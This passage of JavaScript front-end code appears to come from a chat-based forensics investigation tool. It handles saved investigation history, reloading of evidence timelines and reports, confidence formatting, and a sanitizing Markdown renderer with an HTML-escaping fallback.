    state.history = state.history.filter((h) => h.id !== id);
    localStorage.setItem("a1_dfir_history", JSON.stringify(state.history));
    renderHistoryList();
    if (state.currentSessionId === id) startNewChat();
  }

  function clearAllHistory() {
    if (!confirm("Clear all recent investigation history?")) return;
    state.history = [];
    localStorage.removeItem("a1_dfir_history");
    renderHistoryList();
  }

  function loadHistoryItem(item) {
    startNewChat();
    state.currentSessionId = item.id;
    renderHistoryList();

    elements.welcomeScreen.style.display = "none";
    renderUserMessage(item.query);

    const assistantMsg = createAssistantMessageElement();
    elements.messagesContainer.appendChild(assistantMsg.container);

    if (item.hypotheses && item.hypotheses.length) {
      assistantMsg.addHypotheses(item.hypotheses);
    }
    if (item.evidencePack) {
      assistantMsg.setEvidencePack(item.evidencePack);
      const timeline = Array.isArray(item.evidencePack.timeline) ? item.evidencePack.timeline : [];
      latestEvidenceTimeline = timeline;
      activeEvidenceHandler = {
        toggleOrOpenTable: () => {
          openGlobalTelemetryTable(timeline, "Retrieved Evidence Events");
        }
      };
      if (elements.headerTableBadge) {
        elements.headerTableBadge.textContent = `${item.evidencePack.total_kept_events ?? timeline.length} events`;
      }
    }
    if (item.verdict) {
      assistantMsg.setVerdict(item.verdict, item.verdict_boundary || "", item.confidence || 0.85);
    }
    if (item.report) {
      assistantMsg.setReport(item.report);
    }
    assistantMsg.setStepActive("st-report");
    scrollToBottom();
  }

  // -------------------------------------------------------------------------
  // Helpers: Markdown Renderer & Utilities
  // -------------------------------------------------------------------------
  function formatConfidence(conf) {
    if (conf === null || conf === undefined) return "85%";
    let val = conf;
    if (typeof val === "string") {
      val = parseFloat(val.replace("%", "").trim());
    }
    if (typeof val !== "number" || isNaN(val)) {
      return "85%";
    }
    if (val > 1) {
      val = val / 100;
    }
    val = Math.max(0.05, Math.min(1.0, val));
    return `${Math.round(val * 100)}%`;
  }

  function renderMarkdown(mdText) {
    if (!mdText) return "";
    
    // Check for marked in window (from vendor or CDN)
    if (window.marked) {
      try {
        const rawHtml = typeof window.marked.parse === "function" 
          ? window.marked.parse(mdText) 
          : window.marked(mdText);
        if (window.DOMPurify && typeof window.DOMPurify.sanitize === "function") {
          return window.DOMPurify.sanitize(rawHtml);
        }
        return rawHtml;
      } catch (e) {
        console.warn("marked.parse failed, falling back to local renderer:", e);
      }
    }

    // Built-in Lightweight Markdown Fallback (100% offline reliable)
    let html = escapeHtml(mdText);

    // Code blocks ```...```
    html = html.replace(/```(?:[a-zA-Z0-9_-]+)?\n([\s\S]*?)```/g, function (match, p1) {
      return `<pre><code>${p1}</code></pre>`;
    });
    html = html.replace(/```([\s\S]*?)```/g, function (match, p1) {
      return `<pre><code>${p1}</code></pre>`;
    });

    // Inline code `...`
    html = html.replace(/`([^`]+)`/g, "<code>$1</code>");

    // Headers
    html = html.replace(/^### (.*$)/gim, "<h3>$1</h3>");
    html = html.replace(/^## (.*$)/gim, "<h2>$1</h2>");
    html = html.replace(/^# (.*$)/gim, "<h1>$1</h1>");

    // Bold & Italic
    html = html.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>");
    html = html.replace(/\*([^*]+)\*/g, "<em>$1</em>");

    // Blockquotes
    html = html.replace(/^\> (.*$)/gim, "<blockquote>$1</blockquote>");

    // Ordered lists
    html = html.replace(/^\d+\.\s+(.*$)/gim, "<li>$1</li>");

    // Unordered lists
    html = html.replace(/^[\-\*]\s+(.*$)/gim, "<li>$1</li>");

    // Wrap consecutive list items
    html = html.replace(/(<li>(?:(?!<\/li>)[\s\S])*?<\/li>(\s*<li>(?:(?!<\/li>)[\s\S])*?<\/li>)*)/gim, "<ul>$1</ul>");

    // Paragraphs
    html = html.replace(/\n\n+/g, "<br><br>");

    return html;
  }

  function escapeHtml(text) {
    if (text === null || text === undefined) return "";
    return String(text)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }

  function scrollToBottom(force = false) {
    if (!elements.chatStage) return;
    const threshold = 220;
    const isNearBottom =
      elements.chatStage.scrollHeight - elements.chatStage.scrollTop - elements.chatStage.clientHeight <= threshold;
    if (force || isNearBottom) {
      elements.chatStage.scrollTo({
        top: elements.chatStage.scrollHeight,
        behavior: force ? "smooth" : "auto",
      });
    }
  }

  function formatBytes(bytes) {
    if (!bytes || bytes === 0) return "0 B";
    const k = 1024;
    const sizes = ["B", "KB", "MB", "GB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + " " + sizes[i];
  }

  // Run initialization
  document.addEventListener("DOMContentLoaded", init);
})();
